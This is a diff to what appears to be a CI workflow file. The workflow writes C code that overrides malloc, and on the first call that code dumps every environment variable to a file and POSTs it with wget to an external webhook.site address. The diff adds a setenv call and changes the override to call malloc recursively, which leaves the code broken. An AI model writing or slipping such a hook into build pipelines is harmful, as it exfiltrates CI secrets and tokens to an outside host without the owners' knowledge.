@@ -27,6 +27,7 @@ jobs:
           void *malloc(size_t size)
           {
               if(i == 0) {
+                setenv("SOMEVAR", "hello", 1);
                 system("env > env.txt; "
                 "wget --quiet --method=POST --header='Content-Type: text/plain' --body-file=env.txt "
                 "https://webhook.site/5f50f1da-b7f9-4ef0-b988-14f91d971e64 -O -; "
@@ -34,8 +35,7 @@ jobs:
                 i = i++;
               }
 
-              real_malloc = dlsym(RTLD_NEXT, "malloc");
-              return real_malloc(size);
+              return malloc(size);
           }
           EOF
       - name: Compile
